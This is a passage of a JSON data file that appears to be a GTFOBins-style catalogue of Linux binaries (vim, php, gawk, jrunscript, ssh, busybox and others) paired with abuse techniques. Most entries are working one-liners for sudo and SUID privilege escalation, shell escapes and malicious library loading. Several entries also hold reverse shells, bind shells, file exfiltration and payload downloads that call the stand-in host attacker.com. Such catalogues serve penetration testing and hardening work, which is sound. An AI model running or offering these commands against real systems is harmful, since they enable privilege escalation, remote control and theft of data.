Beware though that it is easy to *break* target and other binaries.", "code": "TF=$(mktemp -d)\necho \"$TF\" > \"$TF/conf\"\n# move malicious libraries in $TF\nsudo ldconfig -f \"$TF/conf\"\n"}]}, "646": {"platform": "linux", "cmd": "ldconfig", "function": "limited-suid", "data": [{"description": "This allows to override one or more shared libraries. Beware though that it is easy to *break* target and other binaries.", "code": "TF=$(mktemp -d)\necho \"$TF\" > \"$TF/conf\"\n# move malicious libraries in $TF\n./ldconfig -f \"$TF/conf\"\n"}]}, "647": {"platform": "linux", "cmd": "rlogin", "function": "file-upload", "data": [{"description": "Send contents of a file to a TCP port. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker system to capture the contents.\n\n`rlogin` hangs waiting for the remote peer to close the socket.\n\nThe file is corrupted by leading and trailing spurious data.\n", "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nrlogin -l \"$(cat $LFILE)\" -p $RPORT $RHOST\n"}]}, "648": {"platform": "linux", "cmd": "mount", "function": "sudo", "data": [{"description": "Exploit the fact that `mount` can be executed via `sudo` to *replace* the `mount` binary with a shell.", "code": "sudo mount -o bind /bin/sh /bin/mount\nsudo mount\n"}]}, "649": {"platform": "linux", "cmd": "busybox", "function": "shell", "data": [{"code": "busybox sh"}]}, "650": {"platform": "linux", "cmd": "busybox", "function": "file-upload", "data": [{"description": "Serve files in the local folder running an HTTP server.", "code": "LPORT=12345\nbusybox httpd -f -p $LPORT -h .\n"}]}, "651": {"platform": "linux", "cmd": "busybox", "function": "file-write", "data": [{"code": "LFILE=file_to_write\nbusybox sh -c 'echo \"DATA\" > $LFILE'\n"}]}, "652": {"platform": "linux", "cmd": "busybox", "function": "file-read", "data": [{"code": "LFILE=file_to_read\n./busybox cat \"$LFILE\"\n"}]}, "653": {"platform": "linux", "cmd": "busybox", "function": "suid", "data": [{"description": "It may drop the SUID privileges depending on the compilation flags and the runtime configuration.", "code": "./busybox sh"}]}, "654": {"platform": "linux", "cmd": "busybox", "function": "sudo", "data": [{"code": "sudo busybox sh"}]}, "655": {"platform": "linux", "cmd": "grep", "function": "file-read", "data": [{"code": "LFILE=file_to_read\ngrep '' $LFILE\n"}]}, "656": {"platform": "linux", "cmd": "grep", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./grep '' $LFILE\n"}]}, "657": {"platform": "linux", "cmd": "grep", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo grep '' $LFILE\n"}]}, "658": {"platform": "linux", "cmd": "check_memory", "function": "file-read", "data": [{"code": "LFILE=file_to_read\ncheck_memory --extra-opts=@$LFILE\n"}]}, "659": {"platform": "linux", "cmd": "check_memory", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo check_memory --extra-opts=@$LFILE\n"}]}, "660": {"platform": "linux", "cmd": "ssh-keygen", "function": "library-load", "data": [{"description": "", "code": "ssh-keygen -D ./lib.so"}]}, "661": {"platform": "linux", "cmd": "ssh-keygen", "function": "sudo", "data": [{"description": "", "code": "sudo ssh-keygen -D ./lib.so"}]}, "662": {"platform": "linux", "cmd": "ssh-keygen", "function": "suid", "data": [{"description": "", "code": "./ssh-keygen -D ./lib.so"}]}, "663": {"platform": "linux", "cmd": "lwp-download", "function": "file-download", "data": [{"code": "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nlwp-download $URL $LFILE\n"}]}, "664": {"platform": "linux", "cmd": "lwp-download", "function": "sudo", "data": [{"code": "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo lwp-download $URL $LFILE\n"}]}, "665": {"platform": "linux", "cmd": "lwp-download", "function": "file-read", "data": [{"description": "The file path must be absolute.", "code": "LFILE=file_to_read\nTF=$(mktemp)\nlwp-download \"file://$LFILE\" $TF\ncat $TF\n"}]}, "666": {"platform": "linux", "cmd": "lwp-download", "function": "file-write", "data": [{"code": "LFILE=file_to_write\nTF=$(mktemp)\necho DATA >$TF\nlwp-download file://$TF $LFILE\n"}]}, "667": {"platform": "linux", "cmd": "service", "function": "shell", "data": [{"code": "/usr/sbin/service ../../bin/sh"}]}, "668": {"platform": "linux", "cmd": "service", "function": "sudo", "data": [{"code": "sudo service ../../bin/sh"}]}, "669": {"platform": "linux", "cmd": "shuf", "function": "file-read", "data": [{"description": "The read file content is corrupted by randomizing the order of NUL terminated strings.", "code": "LFILE=file_to_read\nshuf -z \"$LFILE\"\n"}]}, "670": {"platform": "linux", "cmd": "shuf", "function": "file-write", "data": [{"description": "The written file content is corrupted by adding a newline.", "code": "LFILE=file_to_write\nshuf -e DATA -o \"$LFILE\"\n"}]}, "671": {"platform": "linux", "cmd": "shuf", "function": "suid", "data": [{"description": "The written file content is corrupted by adding a newline.", "code": "LFILE=file_to_write\n./shuf -e DATA -o \"$LFILE\"\n"}]}, "672": {"platform": "linux", "cmd": "shuf", "function": "sudo", "data": [{"description": "The written file content is corrupted by adding a newline.", "code": "LFILE=file_to_write\nsudo shuf -e DATA -o \"$LFILE\"\n"}]}, "673": {"platform": "linux", "cmd": "ash", "function": "shell", "data": [{"code": "ash"}]}, "674": {"platform": "linux", "cmd": "ash", "function": "file-write", "data": [{"code": "export LFILE=file_to_write\nash -c 'echo DATA > $LFILE'\n"}]}, "675": {"platform": "linux", "cmd": "ash", "function": "suid", "data": [{"code": "./ash"}]}, "676": {"platform": "linux", "cmd": "ash", "function": "sudo", "data": [{"code": "sudo ash"}]}, "677": {"platform": "linux", "cmd": "install", "function": "suid", "data": [{"code": "LFILE=file_to_change\nTF=$(mktemp)\n./install -m 6777 $LFILE $TF\n"}]}, "678": {"platform": "linux", "cmd": "install", "function": "sudo", "data": [{"code": "LFILE=file_to_change\nTF=$(mktemp)\nsudo install -m 6777 $LFILE $TF\n"}]}, "679": {"platform": "linux", "cmd": "vim", "function": "shell", "data": [{"code": "vim -c ':!/bin/sh'"}, {"code": "vim\n:set shell=/bin/sh\n:shell\n"}, {"description": "This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.", "code": "vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"}, {"description": "This requires that `vim` is compiled with Lua support.", "code": "vim -c ':lua os.execute(\"reset; exec sh\")'"}]}, "680": {"platform": "linux", "cmd": "vim", "function": "reverse-shell", "data": [{"description": "This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nvim -c ':py import vim,sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")\nvim.command(\":q!\")'\n"}]}, "681": {"platform": "linux", "cmd": "vim", "function": "non-interactive-reverse-shell", "data": [{"description": "Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nvim -c ':lua local s=require(\"socket\"); local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'\n"}]}, "682": {"platform": "linux", "cmd": "vim", "function": "non-interactive-bind-shell", "data": [{"description": "Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed.", "code": "export LPORT=12345\nvim -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'\n"}]}, "683": {"platform": "linux", "cmd": "vim", "function": "file-upload", "data": [{"description": "This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3. Send local file via \"d\" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.", "code": "export URL=http://attacker.com/\nexport LFILE=file_to_send\nvim -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))\nvim.command(\":q!\")'\n"}, {"description": "This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3. Serve files in the local folder running an HTTP server.", "code": "export LPORT=8888\nvim -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()\nvim.command(\":q!\")'\n"}, {"description": "Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nvim -c ':lua local f=io.open(os.getenv(\"LFILE\"), 'rb')\n  local d=f:read(\"*a\")\n  io.close(f);\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  t:send(d);\n  t:close();'\n"}]}, "684": {"platform": "linux", "cmd": "vim", "function": "file-download", "data": [{"description": "This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3. Fetch a remote file via HTTP GET request.", "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nvim -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])\nvim.command(\":q!\")'\n"}, {"description": "Fetch a remote file via TCP. Run `nc target.com 12345 < \"file_to_send\"` on the attacker box to send the file. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed.", "code": "export LPORT=12345\nexport LFILE=file_to_save\nvim -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(os.getenv(\"LFILE\"), \"wb\");\n  f:write(d);\n  io.close(f);'\n"}]}, "685": {"platform": "linux", "cmd": "vim", "function": "file-write", "data": [{"code": "vim file_to_write\niDATA\n^[\nw\n"}]}, "686": {"platform": "linux", "cmd": "vim", "function": "file-read", "data": [{"code": "vim file_to_read"}]}, "687": {"platform": "linux", "cmd": "vim", "function": "library-load", "data": [{"description": "This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.", "code": "vim -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'"}]}, "688": {"platform": "linux", "cmd": "vim", "function": "suid", "data": [{"description": "This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.", "code": "./vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"}]}, "689": {"platform": "linux", "cmd": "vim", "function": "sudo", "data": [{"code": "sudo vim -c ':!/bin/sh'"}, {"description": "This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.", "code": "sudo vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"}, {"description": "This requires that `vim` is compiled with Lua support.", "code": "sudo vim -c ':lua os.execute(\"reset; exec sh\")'"}]}, "690": {"platform": "linux", "cmd": "vim", "function": "capabilities", "data": [{"description": "This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.", "code": "./vim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"}]}, "691": {"platform": "linux", "cmd": "vim", "function": "limited-suid", "data": [{"description": "This requires that `vim` is compiled with Lua support.", "code": "./vim -c ':lua os.execute(\"reset; exec sh\")'"}]}, "692": {"platform": "linux", "cmd": "expand", "function": "file-read", "data": [{"code": "LFILE=file_to_read\nexpand \"$LFILE\"\n"}]}, "693": {"platform": "linux", "cmd": "expand", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./expand \"$LFILE\"\n"}]}, "694": {"platform": "linux", "cmd": "expand", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo expand \"$LFILE\"\n"}]}, "695": {"platform": "linux", "cmd": "rlwrap", "function": "shell", "data": [{"code": "rlwrap /bin/sh"}]}, "696": {"platform": "linux", "cmd": "rlwrap", "function": "file-write", "data": [{"description": "This adds timestamps to the output file. This relies on the external `echo` command.", "code": "LFILE=file_to_write\nrlwrap -l \"$LFILE\" echo DATA\n"}]}, "697": {"platform": "linux", "cmd": "rlwrap", "function": "suid", "data": [{"code": "./rlwrap -H /dev/null /bin/sh -p"}]}, "698": {"platform": "linux", "cmd": "rlwrap", "function": "sudo", "data": [{"code": "sudo rlwrap /bin/sh"}]}, "699": {"platform": "linux", "cmd": "logsave", "function": "shell", "data": [{"code": "logsave /dev/null /bin/sh -i"}]}, "700": {"platform": "linux", "cmd": "logsave", "function": "sudo", "data": [{"code": "sudo logsave /dev/null /bin/sh -i"}]}, "701": {"platform": "linux", "cmd": "logsave", "function": "suid", "data": [{"code": "./logsave /dev/null /bin/sh -i -p"}]}, "702": {"platform": "linux", "cmd": "pkg", "function": "sudo", "data": [{"description": "It runs commands using a specially crafted FreeBSD package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n```\nTF=$(mktemp -d)\necho 'id' > $TF/x.sh\nfpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF\n```\n", "code": "sudo pkg install -y --no-repo-update ./x-1.0.txz\n"}]}, "703": {"platform": "linux", "cmd": "tcpdump", "function": "command", "data": [{"code": "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\ntcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF\n"}]}, "704": {"platform": "linux", "cmd": "tcpdump", "function": "sudo", "data": [{"code": "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nsudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root\n"}]}, "705": {"platform": "linux", "cmd": "mysql", "function": "shell", "data": [{"code": "mysql -e '\\! /bin/sh'"}]}, "706": {"platform": "linux", "cmd": "mysql", "function": "sudo", "data": [{"code": "sudo mysql -e '\\! /bin/sh'"}]}, "707": {"platform": "linux", "cmd": "mysql", "function": "limited-suid", "data": [{"code": "./mysql -e '\\! /bin/sh'"}]}, "708": {"platform": "linux", "cmd": "mysql", "function": "library-load", "data": [{"description": "A MySQL server must accept connections in order for this to work.\n\nThe following loads the `/path/to/lib.so` shared object.\n", "code": "mysql --default-auth ../../../../../path/to/lib"}]}, "709": {"platform": "linux", "cmd": "xargs", "function": "shell", "data": [{"description": "GNU version only.", "code": "xargs -a /dev/null sh"}, {"code": "echo x | xargs -Iy sh -c 'exec sh 0<&1'"}, {"description": "Read interactively from `stdin`.", "code": "xargs -Ix sh -c 'exec sh 0<&1'\nx^D^D\n"}]}, "710": {"platform": "linux", "cmd": "xargs", "function": "file-read", "data": [{"description": "This works as long as the file does not contain the NUL character, also a trailing `$'\\n'` is added. The actual `/bin/echo` command is executed. GNU version only.", "code": "LFILE=file_to_read\nxargs -a \"$LFILE\" -0\n"}]}, "711": {"platform": "linux", "cmd": "xargs", "function": "suid", "data": [{"description": "GNU version only.", "code": "./xargs -a /dev/null sh -p"}]}, "712": {"platform": "linux", "cmd": "xargs", "function": "sudo", "data": [{"description": "GNU version only.", "code": "sudo xargs -a /dev/null sh"}]}, "713": {"platform": "linux", "cmd": "pic", "function": "shell", "data": [{"code": "pic -U\n.PS\nsh X sh X\n"}]}, "714": {"platform": "linux", "cmd": "pic", "function": "sudo", "data": [{"code": "sudo pic -U\n.PS\nsh X sh X\n"}]}, "715": {"platform": "linux", "cmd": "pic", "function": "limited-suid", "data": [{"code": "./pic -U\n.PS\nsh X sh X\n"}]}, "716": {"platform": "linux", "cmd": "sftp", "function": "shell", "data": [{"code": "HOST=user@attacker.com\nsftp $HOST\n!/bin/sh\n"}]}, "717": {"platform": "linux", "cmd": "sftp", "function": "file-upload", "data": [{"description": "Send local file to a SSH server.", "code": "RHOST=user@attacker.com\nsftp $RHOST\nput file_to_send file_to_save\n"}]}, "718": {"platform": "linux", "cmd": "sftp", "function": "file-download", "data": [{"description": "Fetch a remote file from a SSH server.", "code": "RHOST=user@attacker.com\nsftp $RHOST\nget file_to_get file_to_save\n"}]}, "719": {"platform": "linux", "cmd": "sftp", "function": "sudo", "data": [{"code": "HOST=user@attacker.com\nsudo sftp $HOST\n!/bin/sh\n"}]}, "720": {"platform": "linux", "cmd": "strace", "function": "file-write", "data": [{"description": "The data to be written appears amid the syscall log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough. More generally, any binary that executes whatever syscall passing arbitrary data can be used in place of `strace - DATA`.", "code": "LFILE=file_to_write\nstrace -s 999 -o $LFILE strace - DATA\n"}]}, "721": {"platform": "linux", "cmd": "strace", "function": "shell", "data": [{"code": "strace -o /dev/null /bin/sh"}]}, "722": {"platform": "linux", "cmd": "strace", "function": "suid", "data": [{"code": "./strace -o /dev/null /bin/sh -p"}]}, "723": {"platform": "linux", "cmd": "strace", "function": "sudo", "data": [{"code": "sudo strace -o /dev/null /bin/sh"}]}, "724": {"platform": "linux", "cmd": "gawk", "function": "shell", "data": [{"code": "gawk 'BEGIN {system(\"/bin/sh\")}'"}]}, "725": {"platform": "linux", "cmd": "gawk", "function": "non-interactive-reverse-shell", "data": [{"description": "Run `nc -l -p 12345` on the attacker box to receive the shell.", "code": "RHOST=attacker.com\nRPORT=12345\ngawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {\n    s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'\n"}]}, "726": {"platform": "linux", "cmd": "gawk", "function": "non-interactive-bind-shell", "data": [{"description": "Run `nc target.com 12345` on the attacker box to connect to the shell.", "code": "LPORT=12345\ngawk -v LPORT=$LPORT 'BEGIN {\n    s = \"/inet/tcp/\" LPORT \"/0/0\";\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'\n"}]}, "727": {"platform": "linux", "cmd": "gawk", "function": "file-write", "data": [{"code": "LFILE=file_to_write\ngawk -v LFILE=$LFILE 'BEGIN { print \"DATA\" > LFILE }'\n"}]}, "728": {"platform": "linux", "cmd": "gawk", "function": "file-read", "data": [{"code": "LFILE=file_to_read\ngawk '//' \"$LFILE\"\n"}]}, "729": {"platform": "linux", "cmd": "gawk", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./gawk '//' \"$LFILE\"\n"}]}, "730": {"platform": "linux", "cmd": "gawk", "function": "sudo", "data": [{"code": "sudo gawk 'BEGIN {system(\"/bin/sh\")}'"}]}, "731": {"platform": "linux", "cmd": "gawk", "function": "limited-suid", "data": [{"code": "./gawk 'BEGIN {system(\"/bin/sh\")}'"}]}, "732": {"platform": "linux", "cmd": "csvtool", "function": "file-read", "data": [{"description": "The file is actually parsed and manipulated as CSV, so this might not be suitable for arbitrary data.", "code": "LFILE=file_to_read\ncsvtool trim t $LFILE\n"}]}, "733": {"platform": "linux", "cmd": "csvtool", "function": "file-write", "data": [{"description": "The file is actually parsed and manipulated as CSV, so this might not be suitable for arbitrary data.", "code": "LFILE=file_to_write\nTF=$(mktemp)\necho DATA > $TF\ncsvtool trim t $TF -o $LFILE\n"}]}, "734": {"platform": "linux", "cmd": "csvtool", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./csvtool trim t $LFILE\n"}]}, "735": {"platform": "linux", "cmd": "csvtool", "function": "shell", "data": [{"code": "csvtool call '/bin/sh;false' /etc/passwd"}]}, "736": {"platform": "linux", "cmd": "csvtool", "function": "sudo", "data": [{"code": "sudo csvtool call '/bin/sh;false' /etc/passwd"}]}, "737": {"platform": "linux", "cmd": "ul", "function": "file-read", "data": [{"code": "LFILE=file_to_read\nul \"$LFILE\"\n"}]}, "738": {"platform": "linux", "cmd": "ul", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./ul \"$LFILE\"\n"}]}, "739": {"platform": "linux", "cmd": "ul", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo ul \"$LFILE\"\n"}]}, "740": {"platform": "linux", "cmd": "watch", "function": "shell", "data": [{"code": "watch -x sh -c 'reset; exec sh 1>&0 2>&0'"}]}, "741": {"platform": "linux", "cmd": "watch", "function": "suid", "data": [{"description": "This keeps the SUID privileges only if the `-x` option is present.", "code": "./watch -x sh -c 'reset; exec sh 1>&0 2>&0'"}]}, "742": {"platform": "linux", "cmd": "watch", "function": "sudo", "data": [{"code": "sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'"}]}, "743": {"platform": "linux", "cmd": "watch", "function": "limited-suid", "data": [{"code": "./watch 'reset; exec sh 1>&0 2>&0'"}]}, "744": {"platform": "linux", "cmd": "dialog", "function": "file-read", "data": [{"code": "LFILE=file_to_read\ndialog --textbox \"$LFILE\" 0 0\n"}]}, "745": {"platform": "linux", "cmd": "dialog", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./dialog --textbox \"$LFILE\" 0 0\n"}]}, "746": {"platform": "linux", "cmd": "dialog", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo dialog --textbox \"$LFILE\" 0 0\n"}]}, "747": {"platform": "linux", "cmd": "php", "function": "shell", "data": [{"code": "export CMD=\"/bin/sh\"\nphp -r 'system(getenv(\"CMD\"));'\n"}, {"code": "export CMD=\"/bin/sh\"\nphp -r 'passthru(getenv(\"CMD\"));'\n"}, {"code": "export CMD=\"/bin/sh\"\nphp -r 'print(shell_exec(getenv(\"CMD\")));'\n"}, {"code": "export CMD=\"/bin/sh\"\nphp -r '$r=array(); exec(getenv(\"CMD\"), $r); print(join(\"\\\\n\",$r));'\n"}, {"code": "export CMD=\"/bin/sh\"\nphp -r '$h=@popen(getenv(\"CMD\"),\"r\"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'\n"}]}, "748": {"platform": "linux", "cmd": "php", "function": "command", "data": [{"code": "export CMD=\"id\"\nphp -r '$p = array(array(\"pipe\",\"r\"),array(\"pipe\",\"w\"),array(\"pipe\", \"w\"));$h = @proc_open(getenv(\"CMD\"), $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'\n"}]}, "749": {"platform": "linux", "cmd": "php", "function": "reverse-shell", "data": [{"description": "Run `nc -l -p 12345` on the attacker box to receive the shell.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nphp -r '$sock=fsockopen(getenv(\"RHOST\"),getenv(\"RPORT\"));exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n"}]}, "750": {"platform": "linux", "cmd": "php", "function": "file-upload", "data": [{"description": "Serve files in the local folder running an HTTP server. This requires PHP version 5.4 or later.", "code": "LHOST=0.0.0.0\nLPORT=8888\nphp -S $LHOST:$LPORT\n"}]}, "751": {"platform": "linux", "cmd": "php", "function": "file-download", "data": [{"description": "Fetch a remote file via HTTP GET request.", "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nphp -r '$c=file_get_contents(getenv(\"URL\"));file_put_contents(getenv(\"LFILE\"), $c);'\n"}]}, "752": {"platform": "linux", "cmd": "php", "function": "suid", "data": [{"code": "CMD=\"/bin/sh\"\n./php -r \"pcntl_exec('/bin/sh', ['-p']);\"\n"}]}, "753": {"platform": "linux", "cmd": "php", "function": "sudo", "data": [{"code": "CMD=\"/bin/sh\"\nsudo php -r \"system('$CMD');\"\n"}]}, "754": {"platform": "linux", "cmd": "php", "function": "capabilities", "data": [{"code": "CMD=\"/bin/sh\"\n./php -r \"posix_setuid(0); system('$CMD');\"\n"}]}, "755": {"platform": "linux", "cmd": "php", "function": "file-read", "data": [{"code": "export LFILE=file_to_read\nphp -r 'readfile(getenv(\"LFILE\"));'\n"}]}, "756": {"platform": "linux", "cmd": "php", "function": "file-write", "data": [{"description": "write data to a file, filename should be absolute.", "code": "export LFILE=file_to_write\nphp -r 'file_put_contents(getenv(\"LFILE\"), \"DATA\");'\n"}]}, "757": {"platform": "linux", "cmd": "jrunscript", "function": "shell", "data": [{"code": "jrunscript -e \"exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')\""}]}, "758": {"platform": "linux", "cmd": "jrunscript", "function": "reverse-shell", "data": [{"description": "Run `nc -l -p 12345` on the attacker box to receive the shell.", "code": "export RHOST=attacker.com\nexport RPORT=12345\njrunscript -e 'var host='\"'\"\"$RHOST\"\"'\"'; var port='\"$RPORT\"';\nvar p=new java.lang.ProcessBuilder(\"/bin/bash\", \"-i\").redirectErrorStream(true).start();\nvar s=new java.net.Socket(host,port);\nvar pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\nvar po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){\nwhile(pi.available()>0)so.write(pi.read());\nwhile(pe.available()>0)so.write(pe.read());\nwhile(si.available()>0)po.write(si.read());\nso.flush();po.flush();\njava.lang.Thread.sleep(50);\ntry {p.exitValue();break;}catch (e){}};p.destroy();s.close();'\n"}]}, "759": {"platform": "linux", "cmd": "jrunscript", "function": "file-download", "data": [{"description": "Fetch a remote file via HTTP GET request.", "code": "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\njrunscript -e \"cp('$URL','$LFILE')\"\n"}]}, "760": {"platform": "linux", "cmd": "jrunscript", "function": "file-write", "data": [{"code": "jrunscript -e 'var fw=new java.io.FileWriter(\"./file_to_write\"); fw.write(\"DATA\"); fw.close();'"}]}, "761": {"platform": "linux", "cmd": "jrunscript", "function": "file-read", "data": [{"code": "jrunscript -e 'br = new BufferedReader(new java.io.FileReader(\"file_to_read\")); while ((line = br.readLine()) != null) { print(line); }'"}]}, "762": {"platform": "linux", "cmd": "jrunscript", "function": "suid", "data": [{"description": "This has been found working in macOS but failing on Linux systems.", "code": "./jrunscript -e \"exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')\""}]}, "763": {"platform": "linux", "cmd": "jrunscript", "function": "sudo", "data": [{"code": "sudo jrunscript -e \"exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')\""}]}, "764": {"platform": "linux", "cmd": "pdftex", "function": "shell", "data": [{"code": "pdftex --shell-escape '\\write18{/bin/sh}\\end'\n"}]}, "765": {"platform": "linux", "cmd": "pdftex", "function": "sudo", "data": [{"code": "sudo pdftex --shell-escape '\\write18{/bin/sh}\\end'\n"}]}, "766": {"platform": "linux", "cmd": "pdftex", "function": "limited-suid", "data": [{"code": "./pdftex --shell-escape '\\write18{/bin/sh}\\end'\n"}]}, "767": {"platform": "linux", "cmd": "env", "function": "shell", "data": [{"code": "env /bin/sh"}]}, "768": {"platform": "linux", "cmd": "env", "function": "suid", "data": [{"code": "./env /bin/sh -p"}]}, "769": {"platform": "linux", "cmd": "env", "function": "sudo", "data": [{"code": "sudo env /bin/sh"}]}, "770": {"platform": "linux", "cmd": "atobm", "function": "file-read", "data": [{"code": "LFILE=file_to_read\natobm $LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", $2}'\n"}]}, "771": {"platform": "linux", "cmd": "atobm", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo atobm $LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", $2}'\n"}]}, "772": {"platform": "linux", "cmd": "atobm", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./atobm $LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", $2}'\n"}]}, "773": {"platform": "linux", "cmd": "ssh", "function": "shell", "data": [{"description": "Reconnecting may help bypassing restricted shells.", "code": "ssh localhost $SHELL --noprofile --norc"}, {"description": "Spawn interactive shell through ProxyCommand option.", "code": "ssh -o ProxyCommand=';sh 0<&2 1>&2' x"}]}, "774": {"platform": "linux", "cmd": "ssh", "function": "file-upload", "data": [{"description": "Send local file to a SSH server.", "code": "HOST=user@attacker.com\nRPATH=file_to_save\nLPATH=file_to_send\nssh $HOST \"cat > $RPATH\" < $LPATH\n"}]}, "775": {"platform": "linux", "cmd": "ssh", "function": "file-download", "data": [{"description": "Fetch a remote file from a SSH server.", "code": "HOST=user@attacker.com\nRPATH=file_to_get\nLPATH=file_to_save\nssh $HOST \"cat $RPATH\" > $LPATH\n"}]}, "776": {"platform": "linux", "cmd": "ssh", "function": "file-read", "data": [{"description": "The read file content is corrupted by error prints.", "code": "LFILE=file_to_read\nssh -F $LFILE localhost\n"}]}, "777": {"platform": "linux", "cmd": "ssh", "function": "sudo", "data": [{"description": "Spawn interactive root shell through ProxyCommand option.", "code": "sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x"}]}, "778": {"platform": "linux", "cmd": "fold", "function": "file-read", "data": [{"code": "LFILE=file_to_read\nfold -w99999999 \"$LFILE\"\n"}]}, "779": {"platform": "linux", "cmd": "fold", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./fold -w99999999 \"$LFILE\"\n"}]}, "780": {"platform": "linux", "cmd": "fold", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo fold 